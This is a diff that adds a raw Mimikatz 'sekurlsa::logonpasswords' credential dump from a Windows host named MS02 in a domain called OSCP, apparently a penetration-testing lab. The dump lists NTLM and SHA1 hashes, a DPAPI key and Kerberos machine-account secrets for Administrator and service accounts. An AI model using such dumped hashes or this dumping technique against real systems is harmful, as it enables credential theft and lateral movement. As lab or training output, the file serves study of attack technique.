@@ -1,0 +1,274 @@
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 407844 (00000000:00063924)
+Session           : Interactive from 1
+User Name         : Administrator
+Domain            : OSCP
+Logon Server      : DC01
+Logon Time        : 3/2/2023 10:39:42 AM
+SID               : S-1-5-21-2610934713-1581164095-2706428072-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : OSCP
+         * NTLM     : 59b280ba707d22e3ef0aa587fc29ffe5
+         * SHA1     : f41a495e6d341c7416a42abd14b9aef6f1eb6b17
+         * DPAPI    : 959ad2ea78c63aebf3233679ad90d769
+        tspkg :
+        wdigest :
+         * Username : Administrator
+         * Domain   : OSCP
+         * Password : (null)
+        kerberos :
+         * Username : Administrator
+         * Domain   : OSCP.EXAM
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 121509 (00000000:0001daa5)
+Session           : Service from 0
+User Name         : MSSQL$SQLEXPRESS
+Domain            : NT Service
+Logon Server      : (null)
+Logon Time        : 3/2/2023 10:39:18 AM
+SID               : S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133
+        msv :
+         [00000003] Primary
+         * Username : MS02$
+         * Domain   : OSCP
+         * NTLM     : 83376432af8fb9d8cd88025534ef9b02
+         * SHA1     : c0021113648411df7862bf4f8458cd695e9d3e3f
+        tspkg :
+        wdigest :
+         * Username : MS02$
+         * Domain   : OSCP
+         * Password : (null)
+        kerberos :
+         * Username : MS02$
+         * Domain   : oscp.exam
+         * Password : c0 21 26 92 de 5f 9c 9c 45 f5 ff a3 ea 52 68 a3 44 99 13 04 8a bf 5f 8e c1 1e 54 8e 8e 12 d0 fa 7e f4 3a 46 e5 09 d9 68 5b e1 8f 01 f1 eb ec 87 77 b0 0b b4 0b c4 16 19 d4 65 38 f1 fd 64 85 e6 0a 6f 71 ec 8e 05 8b e2 39 57 d6 d5 90 27 01 51 4f b4 1a 21 1f 50 42 65 2e 77 5b 4b 1b 1f 33 b0 07 14 dd 32 85 eb df 9a 7a 6f e6 65 8d e3 69 32 07 3c 14 f7 e1 ba 16 de 7e 84 cd 57 0a 33 2b 74 32 65 93 d9 36 49 59 23 8b fd 27 ab 88 c7 0e 60 00 25 6d 45 c1 3d 01 7e 79 fa d7 e2 94 14 9f 17 cf 71 0e d8 fd e9 71 91 82 64 d6 3f 94 1d ef 60 23 7f 0c 40 03 f9 7b c2 d4 01 40 c6 06 7c 38 4e 1d b1 ba e9 62 ba 8b 7b 4a b0 52 55 c5 b4 42 a1 88 c7 e8 ad bd 91 b7 5f c1 81 76 24 a5 1c 76 08 98 37 43 52 98 cd 7c 49 1c c9 0d 6d 8b 6e 0b ad
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 118462 (00000000:0001cebe)
+Session           : Service from 0
+User Name         : SQLTELEMETRY$SQLEXPRESS
+Domain            : NT Service
+Logon Server      : (null)
+Logon Time        : 3/2/2023 10:39:18 AM
+SID               : S-1-5-80-1985561900-798682989-2213159822-1904180398-3434236965
+        msv :
+         [00000003] Primary
+         * Username : MS02$
+         * Domain   : OSCP
+         * NTLM     : 83376432af8fb9d8cd88025534ef9b02
+         * SHA1     : c0021113648411df7862bf4f8458cd695e9d3e3f
+        tspkg :
+        wdigest :
+         * Username : MS02$
+         * Domain   : OSCP
+         * Password : (null)
+        kerberos :
+         * Username : MS02$
+         * Domain   : oscp.exam
+         * Password : c0 21 26 92 de 5f 9c 9c 45 f5 ff a3 ea 52 68 a3 44 99 13 04 8a bf 5f 8e c1 1e 54 8e 8e 12 d0 fa 7e f4 3a 46 e5 09 d9 68 5b e1 8f 01 f1 eb ec 87 77 b0 0b b4 0b c4 16 19 d4 65 38 f1 fd 64 85 e6 0a 6f 71 ec 8e 05 8b e2 39 57 d6 d5 90 27 01 51 4f b4 1a 21 1f 50 42 65 2e 77 5b 4b 1b 1f 33 b0 07 14 dd 32 85 eb df 9a 7a 6f e6 65 8d e3 69 32 07 3c 14 f7 e1 ba 16 de 7e 84 cd 57 0a 33 2b 74 32 65 93 d9 36 49 59 23 8b fd 27 ab 88 c7 0e 60 00 25 6d 45 c1 3d 01 7e 79 fa d7 e2 94 14 9f 17 cf 71 0e d8 fd e9 71 91 82 64 d6 3f 94 1d ef 60 23 7f 0c 40 03 f9 7b c2 d4 01 40 c6 06 7c 38 4e 1d b1 ba e9 62 ba 8b 7b 4a b0 52 55 c5 b4 42 a1 88 c7 e8 ad bd 91 b7 5f c1 81 76 24 a5 1c 76 08 98 37 43 52 98 cd 7c 49 1c c9 0d 6d 8b 6e 0b ad
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 3/2/2023 10:39:17 AM
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 74868 (00000000:00012474)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/2/2023 10:39:17 AM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : MS02$
+         * Domain   : OSCP
+         * NTLM     : 01ad644d1727d52a2b387d46063bbe21
+         * SHA1     : a556b97a7294de0df2000901fd1290aaf6e0776d
+        tspkg :
+        wdigest :
+         * Username : MS02$
+         * Domain   : OSCP
+         * Password : (null)
+        kerberos :
+         * Username : MS02$
+         * Domain   : oscp.exam
+         * Password : 2e 28 9a e1 bb d0 53 60 d7 12 a3 63 32 f6 47 9a bd df 41 d7 26 cf bf a6 25 9a d0 e0 de dd ec 4a 12 52 16 aa 7d ab ad dc ba 47 50 3f ea 9c 78 27 c8 32 0f ea fd a3 e3 10 2b a0 21 8d bd 8b c7 88 da 91 b0 15 fd 3e 93 a8 ed df 3e d9 bc 6e e1 0a 0b ff 37 be e2 fd 25 e3 5a aa 12 51 91 95 34 e6 c0 86 5e da 71 48 3a 6e 5f a2 68 fe af 16 cb 19 cd 34 0d 6b 07 3c eb b4 b4 1a fc d3 f3 5a 28 7d b2 a4 f7 4e 07 7a 07 cb 97 d1 3e 29 9f 5c 3a 20 00 bf 62 5d 48 15 08 ff ab 76 3f fa 5e e4 87 8f f4 93 55 d6 af 6f 32 00 78 67 1d 9e 70 56 19 28 9d f4 5a 53 28 80 88 f7 3d 12 ef f5 66 31 86 5b bf 5f a1 57 c2 41 ed 8a 5c 56 f9 0f 75 0e 70 ff 19 07 f7 fd 1f 5c 92 e2 11 e8 05 25 08 1a 94 36 45 0d 32 e0 ba 8a 57 08 4b 41 e1 a3 eb 90 f3 75
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 74840 (00000000:00012458)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/2/2023 10:39:17 AM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : MS02$
+         * Domain   : OSCP
+         * NTLM     : 83376432af8fb9d8cd88025534ef9b02
+         * SHA1     : c0021113648411df7862bf4f8458cd695e9d3e3f
+        tspkg :
+        wdigest :
+         * Username : MS02$
+         * Domain   : OSCP
+         * Password : (null)
+        kerberos :
+         * Username : MS02$
+         * Domain   : oscp.exam
+         * Password : c0 21 26 92 de 5f 9c 9c 45 f5 ff a3 ea 52 68 a3 44 99 13 04 8a bf 5f 8e c1 1e 54 8e 8e 12 d0 fa 7e f4 3a 46 e5 09 d9 68 5b e1 8f 01 f1 eb ec 87 77 b0 0b b4 0b c4 16 19 d4 65 38 f1 fd 64 85 e6 0a 6f 71 ec 8e 05 8b e2 39 57 d6 d5 90 27 01 51 4f b4 1a 21 1f 50 42 65 2e 77 5b 4b 1b 1f 33 b0 07 14 dd 32 85 eb df 9a 7a 6f e6 65 8d e3 69 32 07 3c 14 f7 e1 ba 16 de 7e 84 cd 57 0a 33 2b 74 32 65 93 d9 36 49 59 23 8b fd 27 ab 88 c7 0e 60 00 25 6d 45 c1 3d 01 7e 79 fa d7 e2 94 14 9f 17 cf 71 0e d8 fd e9 71 91 82 64 d6 3f 94 1d ef 60 23 7f 0c 40 03 f9 7b c2 d4 01 40 c6 06 7c 38 4e 1d b1 ba e9 62 ba 8b 7b 4a b0 52 55 c5 b4 42 a1 88 c7 e8 ad bd 91 b7 5f c1 81 76 24 a5 1c 76 08 98 37 43 52 98 cd 7c 49 1c c9 0d 6d 8b 6e 0b ad
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : MS02$
+Domain            : OSCP
+Logon Server      : (null)
+Logon Time        : 3/2/2023 10:39:17 AM
+SID               : S-1-5-20
+        msv :
+         [00000003] Primary
+         * Username : MS02$
+         * Domain   : OSCP
+         * NTLM     : 83376432af8fb9d8cd88025534ef9b02
+         * SHA1     : c0021113648411df7862bf4f8458cd695e9d3e3f
+        tspkg :
+        wdigest :
+         * Username : MS02$
+         * Domain   : OSCP
+         * Password : (null)
+        kerberos :
+         * Username : ms02$
+         * Domain   : OSCP.EXAM
+         * Password : c0 21 26 92 de 5f 9c 9c 45 f5 ff a3 ea 52 68 a3 44 99 13 04 8a bf 5f 8e c1 1e 54 8e 8e 12 d0 fa 7e f4 3a 46 e5 09 d9 68 5b e1 8f 01 f1 eb ec 87 77 b0 0b b4 0b c4 16 19 d4 65 38 f1 fd 64 85 e6 0a 6f 71 ec 8e 05 8b e2 39 57 d6 d5 90 27 01 51 4f b4 1a 21 1f 50 42 65 2e 77 5b 4b 1b 1f 33 b0 07 14 dd 32 85 eb df 9a 7a 6f e6 65 8d e3 69 32 07 3c 14 f7 e1 ba 16 de 7e 84 cd 57 0a 33 2b 74 32 65 93 d9 36 49 59 23 8b fd 27 ab 88 c7 0e 60 00 25 6d 45 c1 3d 01 7e 79 fa d7 e2 94 14 9f 17 cf 71 0e d8 fd e9 71 91 82 64 d6 3f 94 1d ef 60 23 7f 0c 40 03 f9 7b c2 d4 01 40 c6 06 7c 38 4e 1d b1 ba e9 62 ba 8b 7b 4a b0 52 55 c5 b4 42 a1 88 c7 e8 ad bd 91 b7 5f c1 81 76 24 a5 1c 76 08 98 37 43 52 98 cd 7c 49 1c c9 0d 6d 8b 6e 0b ad
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 43885 (00000000:0000ab6d)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 3/2/2023 10:39:17 AM
+SID               : S-1-5-96-0-1
+        msv :
+         [00000003] Primary
+         * Username : MS02$
+         * Domain   : OSCP
+         * NTLM     : 83376432af8fb9d8cd88025534ef9b02
+         * SHA1     : c0021113648411df7862bf4f8458cd695e9d3e3f
+        tspkg :
+        wdigest :
+         * Username : MS02$
+         * Domain   : OSCP
+         * Password : (null)
+        kerberos :
+         * Username : MS02$
+         * Domain   : oscp.exam
+         * Password : c0 21 26 92 de 5f 9c 9c 45 f5 ff a3 ea 52 68 a3 44 99 13 04 8a bf 5f 8e c1 1e 54 8e 8e 12 d0 fa 7e f4 3a 46 e5 09 d9 68 5b e1 8f 01 f1 eb ec 87 77 b0 0b b4 0b c4 16 19 d4 65 38 f1 fd 64 85 e6 0a 6f 71 ec 8e 05 8b e2 39 57 d6 d5 90 27 01 51 4f b4 1a 21 1f 50 42 65 2e 77 5b 4b 1b 1f 33 b0 07 14 dd 32 85 eb df 9a 7a 6f e6 65 8d e3 69 32 07 3c 14 f7 e1 ba 16 de 7e 84 cd 57 0a 33 2b 74 32 65 93 d9 36 49 59 23 8b fd 27 ab 88 c7 0e 60 00 25 6d 45 c1 3d 01 7e 79 fa d7 e2 94 14 9f 17 cf 71 0e d8 fd e9 71 91 82 64 d6 3f 94 1d ef 60 23 7f 0c 40 03 f9 7b c2 d4 01 40 c6 06 7c 38 4e 1d b1 ba e9 62 ba 8b 7b 4a b0 52 55 c5 b4 42 a1 88 c7 e8 ad bd 91 b7 5f c1 81 76 24 a5 1c 76 08 98 37 43 52 98 cd 7c 49 1c c9 0d 6d 8b 6e 0b ad
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 43706 (00000000:0000aaba)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 3/2/2023 10:39:17 AM
+SID               : S-1-5-96-0-0
+        msv :
+         [00000003] Primary
+         * Username : MS02$
+         * Domain   : OSCP
+         * NTLM     : 83376432af8fb9d8cd88025534ef9b02
+         * SHA1     : c0021113648411df7862bf4f8458cd695e9d3e3f
+        tspkg :
+        wdigest :
+         * Username : MS02$
+         * Domain   : OSCP
+         * Password : (null)
+        kerberos :
+         * Username : MS02$
+         * Domain   : oscp.exam
+         * Password : c0 21 26 92 de 5f 9c 9c 45 f5 ff a3 ea 52 68 a3 44 99 13 04 8a bf 5f 8e c1 1e 54 8e 8e 12 d0 fa 7e f4 3a 46 e5 09 d9 68 5b e1 8f 01 f1 eb ec 87 77 b0 0b b4 0b c4 16 19 d4 65 38 f1 fd 64 85 e6 0a 6f 71 ec 8e 05 8b e2 39 57 d6 d5 90 27 01 51 4f b4 1a 21 1f 50 42 65 2e 77 5b 4b 1b 1f 33 b0 07 14 dd 32 85 eb df 9a 7a 6f e6 65 8d e3 69 32 07 3c 14 f7 e1 ba 16 de 7e 84 cd 57 0a 33 2b 74 32 65 93 d9 36 49 59 23 8b fd 27 ab 88 c7 0e 60 00 25 6d 45 c1 3d 01 7e 79 fa d7 e2 94 14 9f 17 cf 71 0e d8 fd e9 71 91 82 64 d6 3f 94 1d ef 60 23 7f 0c 40 03 f9 7b c2 d4 01 40 c6 06 7c 38 4e 1d b1 ba e9 62 ba 8b 7b 4a b0 52 55 c5 b4 42 a1 88 c7 e8 ad bd 91 b7 5f c1 81 76 24 a5 1c 76 08 98 37 43 52 98 cd 7c 49 1c c9 0d 6d 8b 6e 0b ad
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 41781 (00000000:0000a335)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 3/2/2023 10:39:17 AM
+SID               :
+        msv :
+         [00000003] Primary
+         * Username : MS02$
+         * Domain   : OSCP
+         * NTLM     : 83376432af8fb9d8cd88025534ef9b02
+         * SHA1     : c0021113648411df7862bf4f8458cd695e9d3e3f
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : MS02$
+Domain            : OSCP
+Logon Server      : (null)
+Logon Time        : 3/2/2023 10:39:17 AM
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : MS02$
+         * Domain   : OSCP
+         * Password : (null)
+        kerberos :
+         * Username : ms02$
+         * Domain   : OSCP.EXAM
+         * Password : c0 21 26 92 de 5f 9c 9c 45 f5 ff a3 ea 52 68 a3 44 99 13 04 8a bf 5f 8e c1 1e 54 8e 8e 12 d0 fa 7e f4 3a 46 e5 09 d9 68 5b e1 8f 01 f1 eb ec 87 77 b0 0b b4 0b c4 16 19 d4 65 38 f1 fd 64 85 e6 0a 6f 71 ec 8e 05 8b e2 39 57 d6 d5 90 27 01 51 4f b4 1a 21 1f 50 42 65 2e 77 5b 4b 1b 1f 33 b0 07 14 dd 32 85 eb df 9a 7a 6f e6 65 8d e3 69 32 07 3c 14 f7 e1 ba 16 de 7e 84 cd 57 0a 33 2b 74 32 65 93 d9 36 49 59 23 8b fd 27 ab 88 c7 0e 60 00 25 6d 45 c1 3d 01 7e 79 fa d7 e2 94 14 9f 17 cf 71 0e d8 fd e9 71 91 82 64 d6 3f 94 1d ef 60 23 7f 0c 40 03 f9 7b c2 d4 01 40 c6 06 7c 38 4e 1d b1 ba e9 62 ba 8b 7b 4a b0 52 55 c5 b4 42 a1 88 c7 e8 ad bd 91 b7 5f c1 81 76 24 a5 1c 76 08 98 37 43 52 98 cd 7c 49 1c c9 0d 6d 8b 6e 0b ad
+        ssp :
+        credman :
+        cloudap :
+
+mimikatz #
